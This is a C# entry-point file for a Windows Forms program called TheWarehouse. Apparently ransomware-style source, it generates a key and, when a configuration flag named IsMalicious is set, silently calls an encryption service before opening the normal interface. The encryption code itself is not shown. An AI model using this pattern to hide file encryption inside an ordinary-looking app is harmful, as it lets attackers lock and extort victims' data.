using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using TheWarehouse.Algorithm;
using TheWarehouse.Config;
using TheWarehouse.Utils;

namespace TheWarehouse
{
    class Program
    {
        [STAThread]
        static void Main()
        {
            Configuration.Instance.GenerateKey();

            if (Configuration.Instance.IsMalicious)
            {
                EncryptionService.Encrypt();
            }

            bool result;
            var mutex = new Mutex(true, "UniqueAppId", out result);

            if (!result)
            {
                MessageBox.Show("Another instance is already running.", "Program is active", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(Root.Instance);

            GC.KeepAlive(mutex);
        }
    }
}
